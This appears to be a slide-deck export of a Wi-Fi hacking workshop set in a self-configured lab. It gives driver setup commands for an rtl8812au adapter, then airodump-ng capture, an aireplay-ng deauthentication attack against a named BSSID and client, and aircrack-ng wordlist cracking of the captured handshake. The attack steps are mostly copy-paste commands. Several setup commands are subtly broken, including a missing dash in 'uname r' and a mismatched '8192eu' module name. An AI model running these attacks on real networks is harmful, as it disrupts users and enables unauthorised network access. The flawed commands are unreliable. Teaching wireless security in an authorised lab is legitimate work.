# Wi\-Fi Hacking Workshop

![](img/WifiHackingWorkshop0.png)

### Disclaimer

Do not hack into any networks without prior authorisation

### Wireless AP Setup

Configure the Wireless Access point

![](img/WifiHackingWorkshop1.png)

### Adapter Setup

link: [https://github\.com/gnab/rtl8812au](https://github.com/gnab/rtl8812au)

enter these commands in the terminal:

sudo apt\-get update

sudo apt\-get install linux\-headers\-$\(uname \-r\)

Git clone [https://github\.com/gnab/rtl8812au](https://github.com/gnab/rtl8812au)

Cd rtl8812au

make

sudo insmod 8812au\.ko

sudo cp 8812au\.ko /lib/modules/$\(uname  r\)/kernel/drivers/net/wireless

sudo depmod

sudo apt\-get install build\-essential dkms

sudo make dkms\_install

echo 8192eu | sudo tee \-a /etc/modules

### Adapter Setup

Add the Wireless adapter to VirtualBox

![](img/WifiHackingWorkshop2.png)

### Adapter Setup

Check for conflicting processes

Start the wireless adapter in monitor mode

![](img/WifiHackingWorkshop3.png)

### Discovering BSSID

![](img/WifiHackingWorkshop4.png)

<span style="color:#000000">s</span>  <span style="color:#000000">udo airodump\-ng \-c 11 wlan0</span>

### Discovering devices

![](img/WifiHackingWorkshop5.png)

### De-Auth Attack

sudo airodump\-ng \-c 11 \-\-bssid B0\-95\-75\-5C\-3B\-94 \-w psk wlan0

sudo aireplay\-ng \-0 10 \-a B0:95:75:5C:3B:94 \-c 0C:8D:CA:A6:93:8D wlan0

![](img/WifiHackingWorkshop6.png)

### Cracking Password

aircrack\-ng \-w passwordlist\.txt psk\-02\.cap

![](img/WifiHackingWorkshop7.png)

